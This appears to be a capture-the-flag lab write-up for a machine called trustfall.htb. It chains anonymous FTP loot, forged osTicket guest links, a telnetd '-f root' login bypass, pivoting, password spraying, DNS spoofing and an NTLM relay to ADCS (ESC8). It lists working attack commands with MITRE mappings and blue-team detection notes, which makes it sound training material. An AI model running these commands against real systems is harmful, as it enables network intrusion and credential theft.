Target : 10.129.70.120

Date : 16/09/2026

```bash
>  echo "10.129.70.120 trustfall.htb" | sudo tee -a /etc/hosts  
Please touch the FIDO authenticator.  
10.129.70.120 trustfall.htb  
>  nmap -sC -sV -O -Pn -p- --min-rate=3000 -T4 10.129.70.120  
Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-16 07:24 +0200  
Nmap scan report for trustfall.htb (10.129.70.120)  
Host is up (0.047s latency).  
Not shown: 65521 filtered tcp ports (no-response)  
PORT      STATE  SERVICE VERSION  
21/tcp    open   ftp     vsftpd 3.0.5  
| ftp-syst:    
|   STAT:    
| FTP server status:  
|      Connected to ::ffff:10.10.15.133  
|      Logged in as ftp  
|      TYPE: ASCII  
|      No session bandwidth limit  
|      Session timeout in seconds is 300  
|      Control connection is plain text  
|      Data connections will be plain text  
|      At session startup, client count was 2  
|      vsFTPd 3.0.5 - secure, fast, stable  
|_End of status  
| ftp-anon: Anonymous FTP login allowed (FTP code 230)  
|_Can't get directory listing: PASV IP 10.10.10.20 is not the same as 10.129.70.120  
22/tcp    open   ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.18 (Ubuntu Linux; protocol 2.0)  
| ssh-hostkey:    
|   256 92:9b:06:ad:92:5c:9e:9c:fd:c7:64:23:6b:72:fe:c5 (ECDSA)  
|_  256 06:fc:54:55:29:6f:e9:22:48:91:e1:1e:ba:b7:35:b5 (ED25519)  
80/tcp    open   http    Apache httpd 2.4.58  
|_http-server-header: Apache/2.4.58 (Ubuntu)  
|_http-title: TrustFall IT Helpdesk  
50000/tcp closed ibm-db2  
50001/tcp closed unknown  
50002/tcp closed iiimsf  
50003/tcp closed unknown  
50004/tcp closed unknown  
50005/tcp closed unknown  
50006/tcp closed unknown  
50007/tcp closed unknown  
50008/tcp closed unknown  
50009/tcp closed unknown  
50010/tcp closed unknown  
Aggressive OS guesses: Linux 5.0 - 5.14 (93%), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3) (93%), Linux 4.15 - 5.19 (90%), Linux 2.6.32 - 3.13 (89%), Linux 5.14 - 6.8 (89%), Linux 3.10 - 4.11 (87%), Linux 5.0 (87  
%), OpenWrt 22.03 (Linux 5.10) (87%), Linux 6.18 (87%), Linux 3.2 - 4.14 (86%)  
No exact OS matches for host (test conditions non-ideal).  
Service Info: Host: catch-all; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel  
  
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
Nmap done: 1 IP address (1 host up) scanned in 61.39 seconds
```

We see that this is an Active Directory with most `closed unknown` as we don't have the right `DC IP` in hosts.

```bash
> echo "10.129.70.120 trustfall.htb ticket.trustfall.htb mailsrv.trustfall.htb dc01.trustfall.htb ws01.trustfall.htb ws02.trustfall.htb" | sudo tee -a /etc/hosts
```

Same VPN IP fronts a Linux mail/ticket stack and a Windows `DC01` guest — mixed TTLs on one address. `trustfall.htb`, `ticket.trustfall.htb`, and `mailsrv.trustfall.htb` are required before the chain makes sense.

`MITRE ID : Reconnaissance + Active Scanning T1595`

Anonymous `FTP` on `21` advertises `PASV` with `10.10.10.20` while we connect to the lab IP — passive listing fails unless we disable PASV.

```bash
> curl -s --ftp-pasv false ftp://10.129.70.120/
> curl -s --ftp-pasv false -o mail_migration_rollback_backup.tar.gz ftp://10.129.70.120/backups/mail_migration_rollback_backup.tar.gz
```

The `backups/` tree holds a Dovecot-style mail-migration dump. Three named users crack into the documented `TrustFall{DEPT}{FirstName}{YYYY}!` scheme — `salvador` logs into Roundcube at `mailsrv.trustfall.htb`; that mailbox receives the `osTicket` self-registration mail.

`MITRE ID : Credential Access + Unsecured Credentials T1552`

`ticket.trustfall.htb` is `osTicket`. Guest access for `TrustFall_TK13` / `santiago@trustfall.htb` authenticates with `a = md5(ticket_id + email.lower() + SECRET_SALT)` — ticket user id `3`, not the display number `13`. Horizon3 `osticket_forge_access_link.py` lands on `tickets.php?id=3` and exposes `ssh_debug.tar.gz`.

```bash
> python3 osticket_forge_access_link.py TrustFall_TK13 3 santiago@trustfall.htb [REDACTED] http://ticket.trustfall.htb
```

Session cookie in hand, we pull the attachment and SSH as `martin` with `id_ed25519` (newline at EOF matters).

`MITRE ID : Initial Access + Exploit Public-Facing Application T1190`

On `ticket01`, `telnetd` listens on `0.0.0.0:23`. `USER='-f root' telnet -a 127.0.0.1` becomes `login -f root` — passwordless root without `sudo` for `martin`.

```bash
> ssh -i id_ed25519 martin@10.129.70.120
> USER='-f root' telnet -a 127.0.0.1
```

Decrypting the `osTicket` mailbox secret with the leaked `SECRET_SALT` yields domain user `john.s`.

`MITRE ID : Privilege Escalation + Exploitation for Client Execution T1203`

`eth0` on the pivot is down at first boot — `ip link set eth0 up` and `dhcpcd eth0` places `ticket01` on `192.168.1.128/24` with gateway `192.168.1.32`. `ping` to `192.168.1.32` (`DC01`) and `192.168.1.64` (`WS01`) works from root on the pivot.

```bash
> ip link set eth0 up
> dhcpcd eth0
> ip -br a
```

We keep the office LAN on loopback forwards through `martin` SSH — `2445→192.168.1.32:445`, `1445→192.168.1.64:445`, `5985→WS01 WinRM`, `4433→DC HTTPS`, `1389→LDAP`, `59850→DC WinRM`.

`MITRE ID : Lateral Movement + Remote Services T1021`

`john.s` clears on `DC01` over the forward. Default `emma.williams` and `jake.r` passwords from the spray stick without an `luis.mody` OU reset — `jake.r` gets WinRM on `WS01`.

```bash
> nxc smb 127.0.0.1 -u john.s -p '[REDACTED]' -d trustfall.htb --port 2445
> nxc winrm 127.0.0.1 -u jake.r -p '[REDACTED]' -d trustfall.htb --port 5985
```

`john.s` holds `ForceChangePassword` on `WS02$`. `rpcclient` over `2445` resets the machine account; `dnstool` rewrites `ws02` from the dead `192.168.1.37` record to pivot `192.168.1.128` (`ldapdelete` then patched add with SOA fallback). `iptables` DNAT on `ticket01` sends inbound `3389` to our `ntlmrelayx` RDP listener on `13389` targeting `https://127.0.0.1:4433/certsrv/` for `ESC8` — waiting on `david.m`'s periodic RDP to `ws02`.

`MITRE ID : Credential Access + Adversary-in-the-Middle T1557`

`david.m` domain auth works on `DC01` and `WS01` over the tunnel once the relay path is live — cleartext from `script01.ps1` / handoff matches this instance. Local `WS01\ws01` PTH with the same NT still returns `STATUS_LOGON_FAILURE` here; the shortcut is not live on this reset.

```bash
> nxc smb 127.0.0.1 -u david.m -p '[REDACTED]' -d trustfall.htb --port 1445
> nxc smb 127.0.0.1 -u ws01 -H [REDACTED] --local-auth --port 1445
```

`luis.mody` was `ACCOUNTDISABLE` — LDAP enable clears `userAccountControl` bit `2`. Leadership-pattern password works after enable. `sql_svc` adds itself to `CN=IT,OU=TrustFall-Groups,…` via LDAP `member` write.

`tom.k` NT from handoff authenticates to `DC01` WinRM on forward `59850`. `C:\Scripts\AdminTools\password_reset.log` shows a successful `aaron.b` reset at `2/17/2026 2:21:01 AM` — `Reset-User.vbs` uses bare `Randomize` semantics (Doyensec), not the `Randomize Timer` text in source. Next beat: seed spray for `aaron.b` → `ESC7` SubCA → `root.txt`; parallel `sql_svc` / `ESC17` rogue `WSUS` or post-DA SOCKS for `user.txt` on `WS01`.

`MITRE ID : Privilege Escalation + Abuse Elevation Control Mechanism T1548`

**Blue Team :**
Dual-guest VPN IP with Linux `ttl≈62` and Windows `ttl≈127` should trigger split-horizon hunts — anon `FTP` Dovecot dumps, forged `osTicket` guest URLs (`md5` ticket links), and `martin` SSH from ticket attachments are the early chain. After pivot, watch `WS02$` password resets, `ws02` DNS rewrites toward `192.168.1.128`, inbound `3389` to the VPN segment (`ntlmrelayx` / `ESC8`), and `IT` group membership changes by `sql_svc`. `tom.k` WinRM to `DC01` plus reads of `password_reset.log` telegraph the VBS RNG path.

**Purple Team :**
We stayed on documented defaults (`emma` / `jake`) and skipped `luis` OU spraying when they already worked. `ws02` DNS spoof plus RDP coerce targets `david.m`'s habit of talking to a dead host — cert over hash when NetNTLM does not crack. Local `ws01` reuse failed on this instance so we kept `sql_svc`→`IT` and `tom.k`→VBS→`ESC7` in reserve instead of burning the MinIO/`WSUS` branch immediately. Guest-link forgery used ticket id `3` because the display id `TrustFall_TK13` alone does not satisfy the `md5` salt line.

